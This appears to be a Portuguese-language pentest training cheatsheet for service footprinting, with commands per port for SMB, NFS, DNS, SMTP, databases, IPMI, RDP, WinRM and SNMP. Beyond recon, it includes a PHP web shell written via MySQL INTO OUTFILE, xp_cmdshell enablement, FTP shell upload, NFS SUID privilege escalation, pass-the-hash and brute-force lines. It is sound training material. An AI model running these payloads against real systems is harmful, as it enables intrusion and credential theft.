---
tema: Pentest / Enumeração
tópico: Footprinting de serviços de rede
tags: [htb, cpts, footprinting, enumeracao, smb, nfs, snmp, dns, smtp, imap, pop3, mysql, mssql, oracle, ipmi, winrm, rdp, ssh]
dificuldade: medium
---

# CPTS 04 - Footprinting — Cheatsheet

> [!info] Escopo deste cartão
> Para **cada serviço comum**: em que porta vive, com quais ferramentas se enumera, quais comandos usar e **o que extrair**.
> Objetivo do footprinting: tirar do serviço o máximo de informação — usuários, shares, versão, hostnames, políticas — antes de pensar em exploit.

---

## 🎯 Quando usar

| Situação | Seção |
|----------|-------|
| Nmap mostrou portas abertas e não sei o próximo passo | Todas as seções do serviço correspondente |
| Preciso de lista de usuários para spray/brute | SMTP, IMAP/POP3, SNMP, RPC |
| Preciso de credencial ou share | SMB, NFS, MySQL, MSSQL, FTP anônimo |
| Serviço exposto sem senha (misconfig) | SNMP `public`, MySQL root vazio, FTP anônimo, NFS `no_root_squash` |
| Quero dados de host/serviço sem autenticar | DNS, SNMP, IPMI, RDP (NTLM info) |

---

## 🧰 Ferramentas

| Ferramenta | Serviços que cobre |
|------------|--------------------|
| `nmap` + NSE | Todos (banner, enum, brute) |
| `ftp`, `lftp`, `wget`, `curl` | FTP |
| `smbclient`, `smbmap`, `rpcclient`, `enum4linux-ng`, `nbtscan`, `nxc` | SMB/NetBIOS/RPC |
| `showmount`, `mount` | NFS |
| `dig`, `dnsenum`, `dnsrecon`, `fierce`, `gobuster dns` | DNS |
| `telnet`, `nc`, `smtp-user-enum`, `swaks` | SMTP |
| `openssl s_client`, `curl`, `nc` | IMAP/POP3 |
| `mysql` | MySQL/MariaDB |
| `mssqlclient.py` (impacket), `sqsh` | MSSQL |
| `odat`, `tnscmd10g` | Oracle TNS |
| `ipmitool`, MSF `scanner/ipmi/*` | IPMI |
| `ssh`, `ssh-audit` | SSH |
| `xfreerdp`, `rdesktop`, `rdp-sec-check` | RDP |
| `evil-winrm` | WinRM |
| `snmpwalk`, `snmp-check`, `onesixtyone`, `braa` | SNMP |
| `hashcat` / `john` | Crackear hashes capturados |

---

## 📊 Mapa rápido de portas

| Porta | Serviço | O que extrair |
|-------|---------|---------------|
| 21 | FTP | Arquivos, backups, versão (DoS/backdoor), escrita anônima |
| 22 | SSH | Banner/versão, métodos de auth, chaves, usuários válidos |
| 25 / 465 / 587 | SMTP | Usuários, banner, relay aberto, software de mail |
| 53 | DNS | Zonas, registros, transferência de zona, versão do BIND |
| 110/995 | POP3 | Usuários, e-mails, credenciais |
| 143/993 | IMAP | Usuários, pastas, e-mails |
| 139/445 | SMB | Shares, usuários, SID, política, versão do Windows |
| 623/udp | IPMI | Versão/BMC, hashes RAKP, usuários |
| 1433 | MSSQL | Versão, bases, `xp_cmdshell`, NTLM info |
| 1521 | Oracle | SID, versão TNS, contas default |
| 2049 | NFS | Exports, arquivos, UID squashing |
| 3306 | MySQL | Bases, usuários, hashes, escrita de arquivo |
| 3389 | RDP | Nome/domínio (NTLM info), criptografia, NLA |
| 5985/5986 | WinRM | Shell remota com credencial/hash |
| 161/udp | SNMP | Hostname, interfaces, processos, usuários, rotas |

---

## 📁 FTP — 21/tcp

| Comando | O que faz |
|---------|-----------|
| `ftp <IP>` | Cliente interativo; teste `anonymous` sem senha |
| `wget -m --no-passive ftp://anonymous:anonymous@<IP>` | Espelha todo o FTP anônimo |
| `curl -u anonymous: ftp://<IP>/` | Lista conteúdo sem cliente interativo |
| `nmap -p21 --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor <IP>` | Anônimo, sistema, backdoor do vsFTPd 2.3.4 |
| `nmap -p21 --script ftp-brute <IP>` | Força bruta (usuário/senha) |
| `hydra -C userpass.txt ftp://<IP>` | Brute com lista combinada |

```bash
# Fluxo típico
ftp <IP>                 # Name: anonymous | Password: <enter>
ls -la                   # procura arquivos escondidos
binary                   # antes de baixar binário
get backup.zip
put shell.php            # só se o diretório for gravável

# Verifica se o diretório aceita escrita (vetor de webshell)
nmap -p21 --script ftp-anon <IP>
```

**O que extrair:** arquivos de backup, `.git`, scripts, arquivos com senha, estrutura de diretórios, se há escrita anônima (upload de webshell).

---

## 🖥️ SMB / NetBIOS — 139, 445/tcp

| Comando | O que faz |
|---------|-----------|
| `smbclient -L //<IP>/ -N` | Lista shares com sessão nula |
| `smbclient //<IP>/<share> -N` | Acessa share anônimo |
| `smbmap -H <IP>` | Shares + permissões (read/write) |
| `nbtscan <IP>` | Nome NetBIOS, domínio, MAC |
| `enum4linux-ng -A <IP>` | Bala de prata: usuários, grupos, shares, política |
| `rpcclient -U "" -N <IP>` | RPC sem credencial |
| `nxc smb <IP> -u <USUARIO> -p '<SENHA>' --shares --users` | Enum autenticada |
| `nmap -p139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users,smb2-security-mode <IP>` | Versão do SO, shares, usuários, assinatura SMB |

```bash
# Enumeração anônima completa
smbclient -L //<IP>/ -N
smbmap -H <IP>
enum4linux-ng -A <IP>

# Comandos úteis dentro do rpcclient (sessão nula)
rpcclient -U "" -N <IP>
#   srvinfo                      -> informações do servidor
#   enumdomusers                 -> lista usuários do domínio
#   enumdomgroups                -> lista grupos
#   querydominfo                 -> info do domínio
#   lookupnames <USUARIO>        -> resolve nome -> SID
#   getdompwinfo                 -> política de senha (para spray)
```

**O que extrair:** lista de usuários, política de senha (min length, lockout), shares graváveis, versão do Windows, SID do domínio, arquivos com credencial.

---

## 📂 NFS — 2049/tcp (e 111 portmapper)

| Comando | O que faz |
|---------|-----------|
| `showmount -e <IP>` | Lista exports NFS |
| `sudo mount -t nfs <IP>:/<share> ./mnt -o nolock` | Monta o export localmente |
| `nmap -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <IP>` | Export, listagem e estatísticas via NSE |
| `rpcinfo -p <IP>` | Serviços RPC registrados |

```bash
# Enumerar e montar
showmount -e <IP>
mkdir -p ./mnt
sudo mount -t nfs <IP>:/srv/share ./mnt -o nolock
ls -la ./mnt && find ./mnt -type f -exec ls -al {} \; | head -50
sudo umount ./mnt

# Checar opções de export (no_root_squash = escalada trivial)
cat /etc/exports   # quando você já tem shell no alvo
```

> [!warning] `no_root_squash`
> Se o export tem `no_root_squash`, um root local no cliente é tratado como root no servidor. Copie um binário SUID para o share e execute no alvo — privesc direto. `all_squash` (padrão) evita isso.

**O que extrair:** arquivos de config, chaves SSH (`~/.ssh/id_rsa`), `.bash_history`, versão do SO pelos arquivos, shares graváveis.

---

## 🌐 DNS — 53/tcp+udp

| Comando | O que faz |
|---------|-----------|
| `dig A <DOMINIO> @<IP>` | Registro A usando o servidor alvo |
| `dig MX/NS/TXT/ANY <DOMINIO> @<IP>` | Mail, nameservers, TXT (SPF/DKIM), tudo |
| `dig AXFR <DOMINIO> @<IP>` | **Transferência de zona** — dump completo |
| `dig CHAOS TXT version.bind @<IP>` | Versão do BIND exposta |
| `dnsenum <DOMINIO> --dnsserver <IP>` | Enum completa + brute de subdomínio |
| `dnsrecon -d <DOMINIO> -n <IP> -a` | AXFR, SRV, brute, reverse |
| `fierce --domain <DOMINIO>` | Descoberta de subdomínios |
| `gobuster dns -d <DOMINIO> -w lista.txt -r <IP>` | Brute de subdomínio com resolver custom |
| `nmap -p53 --script dns-zone-transfer,dns-nsid <IP>` | AXFR e NSID via NSE |

```bash
# Tentar transferência de zona (a falha clássica de DNS)
dig AXFR <DOMINIO> @<IP>
dnsrecon -d <DOMINIO> -n <IP> -a

# Registros secundários que revelam infra
dig TXT <DOMINIO> @<IP>     # SPF -> faixas de IP e provedores de mail
dig SRV _ldap._tcp.<DOMINIO> @<IP>   # DCs do domínio
dig ANY <DOMINIO> @<IP>
```

**O que extrair:** subdomínios, nameservers, servidores de mail, TXT/SPF (faixas e provedores), SRV records (DCs, serviços internos), versão do BIND.

---

## 📧 SMTP — 25, 465, 587/tcp

| Comando | O que faz |
|---------|-----------|
| `telnet <IP> 25` | Sessão manual para banner e comandos |
| `VRFY <usuario>` | Verifica se o usuário existe |
| `EXPN <lista>` | Expande lista de e-mails |
| `smtp-user-enum -M VRFY -U users.txt -t <IP>` | Enumera usuários via VRFY |
| `smtp-user-enum -M RCPT -U users.txt -t <IP>` | Enumera via RCPT TO (mais comum) |
| `swaks --to <EMAIL> --server <IP>` | Testa envio/relay |
| `nmap -p25 --script smtp-commands,smtp-open-relay,smtp-enum-users <IP>` | Comandos, relay aberto, usuários |

```bash
# Sessão manual: banner revela software e domínio
nc <IP> 25
#   EHLO teste
#   VRFY root
#   MAIL FROM:<a@teste.com>
#   RCPT TO:<root@<DOMINIO>>
#   QUIT

# Enumeração em massa
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t <IP>

# Relay aberto: pode enviar phishing em nome do domínio
nmap -p25 --script smtp-open-relay <IP>
```

**O que extrair:** usuários válidos, domínio interno, software/versão do MTA, se há relay aberto.

---

## 📬 IMAP / POP3 — 110, 143 (claro) e 993, 995 (TLS)

| Comando | O que faz |
|---------|-----------|
| `openssl s_client -connect <IP>:993 -crlf -quiet` | Sessão IMAPS cifrada |
| `openssl s_client -connect <IP>:995 -crlf -quiet` | Sessão POP3S cifrada |
| `nc <IP> 143` | Sessão IMAP em texto claro |
| `curl -k 'imaps://<IP>' --user <USUARIO>:<SENHA>` | Lista pastas via IMAP |
| `curl -k 'pop3s://<IP>' --user <USUARIO>:<SENHA>` | Lista mensagens via POP3 |
| `nmap -p110,143,993,995 --script imap-capabilities,pop3-capabilities <IP>` | Capacidades e banner |

```bash
# IMAP manual: login, listar pastas, ler a caixa de entrada
nc <IP> 143
#   a1 LOGIN <USUARIO> <SENHA>
#   a2 LIST "" "*"              -> lista de pastas
#   a3 SELECT INBOX             -> abre a caixa
#   a4 FETCH 1:* (BODY[])       -> baixa mensagens
#   a5 LOGOUT

# Baixar tudo com curl (mais prático)
curl -k 'imaps://<IP>/INBOX' --user '<USUARIO>:<SENHA>' -v
```

**O que extrair:** e-mails com credenciais, links internos, nomes de sistema, tokens, e a confirmação de usuários válidos.

---

## 🐬 MySQL — 3306/tcp

| Comando | O que faz |
|---------|-----------|
| `mysql -u <USUARIO> -p'<SENHA>' -h <IP>` | Conexão remota |
| `mysql -u root -h <IP>` | Testa root **sem senha** (misconfig comum) |
| `nmap -p3306 --script mysql-info,mysql-enum,mysql-databases,mysql-users,mysql-empty-password <IP>` | Info, bases, usuários, senha vazia |

```sql
-- Depois de conectar
SHOW databases;                         -- bases disponíveis
USE <base>;
SHOW tables;                            -- tabelas
SELECT * FROM users;                    -- credenciais em texto/hash
SELECT user, authentication_string FROM mysql.user;   -- hashes locais

-- Se tiver privilégio FILE: leitura e escrita de arquivo no SO
SELECT LOAD_FILE('/etc/passwd');
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/s.php';
```

**O que extrair:** bases e tabelas, credenciais, hashes de senha, `FILE` priv (leitura/escrita no FS), UDF para execução de comando.

---

## 🗄️ MSSQL — 1433/tcp

| Comando | O que faz |
|---------|-----------|
| `mssqlclient.py <USUARIO>@<IP> -windows` | Cliente impacket (auth Windows ou SQL) |
| `sqsh -S <IP> -U <USUARIO> -P '<SENHA>'` | Cliente SQL clássico |
| `nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-brute <IP>` | Versão, NTLM info, brute |
| `nxc mssql <IP> -u <USUARIO> -p '<SENHA>'` | Valida credencial e permissões |

```sql
SELECT @@version;                                   -- versão do SQL Server
SELECT name FROM sys.databases;                     -- bases
SELECT name FROM sys.server_principals;             -- logins
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';                          -- execução de comando
```

**O que extrair:** versão, bases, logins, se `xp_cmdshell` está habilitado (execução = shell Windows), NTLM info (hostname/domínio).

---

## 🏛️ Oracle TNS — 1521/tcp

| Comando | O que faz |
|---------|-----------|
| `tnscmd10g version -h <IP>` | Versão do listener TNS |
| `tnscmd10g status -h <IP>` | Status do listener |
| `nmap -p1521 --script oracle-tns-version,oracle-sid-brute <IP>` | Versão e brute de SID |
| `odat all -s <IP> -p 1521` | Suíte completa de enumeração Oracle |
| `sqlplus <USUARIO>/<SENHA>@<IP>:1521/<SID>` | Login com SID descoberto |

```bash
# Descoberta de SID (nome da instância) e depois login
nmap -p1521 --script oracle-sid-brute <IP>
odat all -s <IP> -p 1521
# Contas default a testar quando autorizado: scott/tiger, system, sys, dbsnmp
```

**O que extrair:** SID, versão, contas default ativas, permissões de banco.

---

## 🔧 IPMI — 623/udp

| Comando | O que faz |
|---------|-----------|
| `nmap -sU --script ipmi-version -p 623 <IP>` | Detecta IPMI e versão/BMC |
| `ipmitool -I lanplus -H <IP> -U <USUARIO> -P '<SENHA>' chassis status` | Estado do chassi (testa credencial) |
| `ipmitool -I lanplus -H <IP> -U <USUARIO> -P '<SENHA>' user list` | Lista usuários do BMC |
| MSF: `auxiliary/scanner/ipmi/ipmi_version` | Versão do BMC |
| MSF: `auxiliary/scanner/ipmi/ipmi_dumphashes` | Captura **hashes RAKP** |

```bash
# Fingerprint
nmap -sU --script ipmi-version -p623 <IP>

# Cracking dos hashes RAKP capturados (o vetor clássico)
hashcat -m 7300 ipmi_hashes.txt ~/wordlists/rockyou.txt
```

**O que extrair:** versão do BMC, lista de usuários, hashes RAKP (crackeáveis; senha do BMC = acesso ao hardware, incluindo console e reboot).

---

## 🔐 SSH — 22/tcp

| Comando | O que faz |
|---------|-----------|
| `nc <IP> 22` | Banner: versão do SSH (procura versões com CVE conhecido) |
| `ssh-audit <IP>` | Algoritmos, chaves e configuração fraca |
| `ssh -o PreferredAuthentications=publickey <USUARIO>@<IP>` | Testa métodos de autenticação |
| `nmap -p22 --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos <IP>` | Métodos, host keys, algoritmos |
| `hydra -l <USUARIO> -P wordlist.txt ssh://<IP>` | Brute (⚠️ gera muitos logs, cuidado com lockout) |

```bash
# Chave privada encontrada (ex.: no NFS/SMB) e com passphrase fraca
chmod 600 id_rsa
ssh -i id_rsa <USUARIO>@<IP>

# Chave protegida por passphrase -> extrai hash e crackeia
ssh2john id_rsa > id_rsa.hash
john --wordlist=~/wordlists/rockyou.txt id_rsa.hash
```

**O que extrair:** versão/baner, métodos de auth aceitos, host keys (fingerprint para relatório), nomes de usuário válidos, chave privada reutilizável.

---

## 🖼️ RDP — 3389/tcp

| Comando | O que faz |
|---------|-----------|
| `nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption <IP>` | **Nome do host e domínio** via NTLM info, nível de cripto |
| `rdp-sec-check.pl <IP>` | Configuração de segurança do RDP |
| `xfreerdp /v:<IP> /u:<USUARIO> /p:'<SENHA>' /cert:ignore /dynamic-resolution` | Sessão gráfica |
| `rdesktop <IP> -u <USUARIO> -p '<SENHA>'` | Alternativa leve |

```bash
# Sem credencial ainda dá para descobrir hostname e domínio
nmap -p3389 --script rdp-ntlm-info <IP>

# Conectar (precisa de X11; /cert:ignore evita prompt de certificado)
xfreerdp /v:<IP> /u:<USUARIO> /p:'<SENHA>' /cert:ignore /dynamic-resolution

# Pass-the-Hash por RDP (restrito/desabilitado por padrão)
xfreerdp /v:<IP> /u:<USUARIO> /pth:<HASH> /cert:ignore
```

**O que extrair:** hostname, domínio, se NLA está exigido, nível de criptografia, configuração de segurança.

---

## 🪟 WinRM — 5985 (HTTP), 5986 (HTTPS)

| Comando | O que faz |
|---------|-----------|
| `nmap -p5985,5986 -sV <IP>` | Detecta WS-Man e versão |
| `evil-winrm -i <IP> -u <USUARIO> -p '<SENHA>'` | Shell PowerShell remota |
| `evil-winrm -i <IP> -u <USUARIO> -H <HASH>` | Pass-the-Hash |
| `nxc winrm <IP> -u <USUARIO> -p '<SENHA>'` | Valida credencial e acesso |
| `Test-WSMan <IP>` (PowerShell) | Confirma serviço ativo |

```bash
# Shell direta com credencial válida
evil-winrm -i <IP> -u <USUARIO> -p '<SENHA>'
# Dentro: upload, download, menu, Invoke-Binary, Bypass-4MSI

# Pass-the-Hash (a senha não é necessária)
evil-winrm -i <IP> -u <USUARIO> -H <HASH>
```

**O que extrair:** confirmação de credencial válida, shell de administração remota, caminho para escalar movimento lateral.

---

## 📡 SNMP — 161/udp (trap em 162)

| Comando | O que faz |
|---------|-----------|
| `snmpwalk -v2c -c public <IP>` | Percorre toda a MIB com a community `public` |
| `snmpwalk -v2c -c public <IP> 1.3.6.1.2.1` | Percorre só a MIB-II (sistema, interfaces, processos) |
| `snmp-check <IP>` | Saída formatada: hostname, usuários, shares, serviços |
| `onesixtyone -c community.txt <IP>` | Brute de community string |
| `braa public@<IP>:.1.3.6.*` | Requisições rápidas em massa |
| `nmap -sU -p161 --script snmp-brute,snmp-info,snmp-sysdescr,snmp-processes <IP>` | Brute, info, descrição, processos |

```bash
# OIDs que mais rendem
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1.1     # descrição do sistema
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1.5     # hostname
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2   # processos rodando
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25    # usuários Windows (SRV)
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.4.20    # tabela de IPs/interfaces
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.6.13.1.3     # portas TCP escutando

# Communities default que valem teste: public, private, manager, internal
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
```

**O que extrair:** hostname, descrição/SO, processos com linha de comando (às vezes com senha), usuários locais, interfaces e portas escutando, rotas, software instalado.

---

## ⚠️ Pegadinhas

| 🕳️ | Detalhe |
|-----|---------|
| Julgar serviço pelo banner | Banner pode ser customizado/fake; confirme com script/pacote. |
| FTP anônimo só leitura | Antes de tentar upload, confirme permissão — não suje o servidor. |
| `showmount` bloqueado | Portmapper filtrado esconde exports; teste 2049 direto. |
| Montar NFS sem `nolock` | Trava e erro de mount; use `-o nolock`. |
| Confundir `filtered` (UDP) com fechado | SNMP/IPMI vivem em UDP e "não respondem" quando filtrados. |
| `VRFY` desabilitado | Muitos MTAs retornam 252 para tudo; teste também `RCPT TO`. |
| Brute agressivo | VM/Windows bloqueia conta (lockout). Confirme a política antes. |
| `xp_cmdshell` já ligado | Nem sempre precisa reconfigurar; verifique antes de mexer. |
| SNMP community errada | v1/v2c em texto claro; v3 exige usuário e pode usar authPriv. |
| Crackear sem autorização | Senha recuperada é evidência, não atalho: registre e reporte. |

---

## ✅ Checklist rápido

- [ ] Cada porta aberta do Nmap tem uma seção de enumeração feita
- [ ] Acesso anônimo/sem senha testado onde aplicável (FTP, SMB, NFS, SNMP, MySQL)
- [ ] Lista de usuários montada (SMTP, SNMP, RPC, IMAP)
- [ ] Política de senha obtida (RPC/SMB) antes de qualquer brute
- [ ] Shares e exports mapeados, com permissão de leitura/escrita anotada
- [ ] Versões registradas para correlação com exploit
- [ ] Hashes capturados (NTLM/RAKP/MySQL/SSH) salvos para cracking
- [ ] UDP testado para os serviços relevantes
- [ ] Toda saída salva em arquivo com nome versionado
- [ ] Achados anotados com evidência (comando + saída)

---

## 🔗 Relacionado

- [[CPTS 03 - Network Enumeration with Nmap]]
- [[CPTS 11 - Attacking Common Services]]
- [[CPTS 10 - Password Attacks]]
- [[Fase 04 - Enumeração de Serviços]]
- [[CPTS 02 - Getting Started]]
